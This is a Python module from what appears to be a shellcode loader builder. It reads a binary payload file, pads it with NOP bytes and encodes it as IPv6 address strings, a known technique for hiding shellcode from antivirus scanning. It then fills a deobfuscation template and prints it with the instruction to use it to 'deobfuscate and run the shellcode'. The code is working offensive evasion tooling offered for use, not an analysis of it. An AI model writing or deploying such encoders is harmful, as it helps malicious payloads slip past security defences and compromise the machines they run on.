import sys
sys.path.append('..')
from Encoder.LoaderStrings import ipv6_deobfuscation_code

def generate_ipv6(filtered_bytes):
    grouped_bytes = [filtered_bytes[i:i+2] for i in range(0, len(filtered_bytes), 2)]
    result = ":".join("{:02X}{:02X}".format(*pair) for pair in grouped_bytes)
    return result

def pad_trailing_bytes(chunk):
    # Pad with "9090" if the chunk ends with 00
    if chunk.endswith(b'\x00'):
        # Check if additional padding is needed
        padding_needed = len(chunk) % 16
        if padding_needed > 0:
            chunk += b'\x90' * (16 - padding_needed)
    return chunk

def generate_ipv6_output(file_path, L):
    global ipv6_deobfuscation_code

    ipv6_list = []
    with open(file_path, "rb") as f:
        while True:
            chunk = f.read(16)
            if not chunk:
                break
            filtered_bytes = pad_trailing_bytes(chunk)
            ipv6_list.append(generate_ipv6(filtered_bytes))

    # Update ipv6_deobfuscation_code with the generated IPv6 strings
    ipv6_code = ", ".join([f'"{ipv6}"' for ipv6 in ipv6_list])
    ipv6_deobfuscation_code = ipv6_deobfuscation_code.replace("// Replace this with the output of generate_ipv6_output function", ipv6_code)

    if L == 1:
        print("\n\n###### USE THE FOLLOWING CODE TO DEOBFUSCATE AND RUN THE SHELLCODE ######\n\n")
        print(ipv6_deobfuscation_code)
    else:
        print(ipv6_list)


